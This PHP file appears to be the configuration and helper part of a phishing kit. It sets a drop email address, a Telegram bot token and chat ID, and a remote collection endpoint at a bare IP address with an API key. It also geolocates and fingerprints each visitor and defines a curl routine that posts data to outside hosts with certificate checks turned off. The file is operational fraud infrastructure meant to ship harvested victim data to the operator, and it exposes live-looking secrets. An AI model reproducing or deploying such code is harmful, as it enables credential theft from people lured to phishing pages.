<?php

session_start();
error_reporting(0);
//-----------------------------------------------------------------------------------//email
$emailDzb = "adwork3.sarl@gmail.com";
$defaultTimeZone='UTC';	
$time = date('l jS \of F Y h:i A');

$botToken='2128167842:AAHllAlGfAUw7fXc_XYazgBRhbryy4iYuQE';
$id ='-622801388';

 $url_api = "http://45.76.144.132/said.php";
 $api_key = "vagswdn4jcwta7q3mct57gdhw4kkgxyrwer2mkbplpneea8w5czwgtz4zy72";
//-----------------------------------------------------------------------------------//Rand
$rand=rand(100000000000000000000, 999999999999999999999999999);
$md = md5($rand);
$base=base64_encode($md);
$dst=md5("$base");
//-----------------------------------------------------------------------------------//Detect ip

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_']));
$LOOKUP_COUNTRY = $IP_LOOKUP->country;
$LOOKUP_CNTRCODE= $IP_LOOKUP->countryCode;
$LOOKUP_CITY    = $IP_LOOKUP->city;
$LOOKUP_REGION  = $IP_LOOKUP->region;
$LOOKUP_STATE   = $IP_LOOKUP->regionName;
$LOOKUP_ZIPCODE = $IP_LOOKUP->zip;
$_SESSION['_LOOKUP_COUNTRY_'] = $LOOKUP_COUNTRY;
$_SESSION['_LOOKUP_CNTRCODE_']= $LOOKUP_CNTRCODE;
$_SESSION['_LOOKUP_CITY_']    = $LOOKUP_CITY;
$_SESSION['_LOOKUP_REGION_']  = $LOOKUP_REGION;
$_SESSION['_LOOKUP_STATE_']   = $LOOKUP_STATE;
$_SESSION['_LOOKUP_ZIPCODE_'] = $LOOKUP_ZIPCODE;
$_SESSION['_LOOKUP_REGIONS_'] = $_SESSION['_LOOKUP_STATE_']."(".$_SESSION['_LOOKUP_REGION_'].")";
$_SESSION['_forlogin_'] = $_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_'];
//-----------------------------------------------------------------------------------//User agent
function DARKER_OS($USER_AGENT){
	$OS_ERROR    =   "Unknown OS Platform";
    $OS  =   array( '/windows nt 10/i'      =>  'Windows 10',
	                '/windows nt 6.3/i'     =>  'Windows 8.1',
	                '/windows nt 6.2/i'     =>  'Windows 8',
	                '/windows nt 6.1/i'     =>  'Windows 7',
	                '/windows nt 6.0/i'     =>  'Windows Vista',
	                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                '/windows nt 5.1/i'     =>  'Windows XP',
	                '/windows xp/i'         =>  'Windows XP',
	                '/windows nt 5.0/i'     =>  'Windows 2000',
	                '/windows me/i'         =>  'Windows ME',
	                '/win98/i'              =>  'Windows 98',
	                '/win95/i'              =>  'Windows 95',
	                '/win16/i'              =>  'Windows 3.11',
	                '/macintosh|mac os x/i' =>  'Mac OS X',
	                '/mac_powerpc/i'        =>  'Mac OS 9',
	                '/linux/i'              =>  'Linux',
	                '/ubuntu/i'             =>  'Ubuntu',
	                '/iphone/i'             =>  'iPhone',
	                '/ipod/i'               =>  'iPod',
	                '/ipad/i'               =>  'iPad',
	                '/android/i'            =>  'Android',
	                '/blackberry/i'         =>  'BlackBerry',
	                '/webos/i'              =>  'Mobile');
    foreach ($OS as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }

    }
    return $OS_ERROR;
}
function DARKER_Browser($USER_AGENT){
	$BROWSER_ERROR    =   "Unknown Browser";
    $BROWSER  =   array('/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($BROWSER as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}


function sendPostRequest($url,$data) 
{
    $response = null;

    # preparing the post data
    $post = array();

    $post = array_merge($post,$data);
    $postFields = http_build_query($post);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$postFields);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}









?>
